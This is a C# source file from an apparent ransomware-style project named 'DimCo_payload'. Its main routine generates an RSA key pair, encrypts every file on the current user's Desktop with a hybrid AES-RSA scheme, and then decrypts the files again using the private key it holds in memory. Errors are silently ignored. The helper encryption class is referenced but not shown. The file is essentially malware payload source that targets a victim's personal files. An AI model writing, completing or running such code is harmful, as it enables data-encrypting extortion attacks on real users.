using System;
using System.IO;
using DimCo_payload.Encryption;

namespace DimCo_payload;

internal static class Program
{
	public static byte[] Base64Decode(string base64EncodedData)
	{
		return Convert.FromBase64String(base64EncodedData);
	}

	private static void setup()
	{
		foreach (string item in global.encrypted)
		{
			try
			{
				if (global.Keys.PrivateKey == null)
				{
					break;
				}
				Console.WriteLine("decrypting " + item);
				string[] array = File.ReadAllText(item).Split(new char[1] { '@' });
				Tuple<byte[], byte[]> encoded = new Tuple<byte[], byte[]>(Base64Decode(array[0]), Base64Decode(array[1]));
				File.WriteAllBytes(item, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, global.Keys.PrivateKey));
				File.Move(item, Path.ChangeExtension(item, null));
			}
			catch
			{
			}
		}
	}

	private static void Main()
	{
		global.Keys = DimCo_payload.Encryption.Encryption.RSA.GenerateKeys(2048);
		DimCo_payload.Encryption.Encryption.Encrypt_Dir("C:\\Users\\" + Environment.UserName + "\\Desktop\\", global.Keys.PublicKey);
		setup();
	}
}
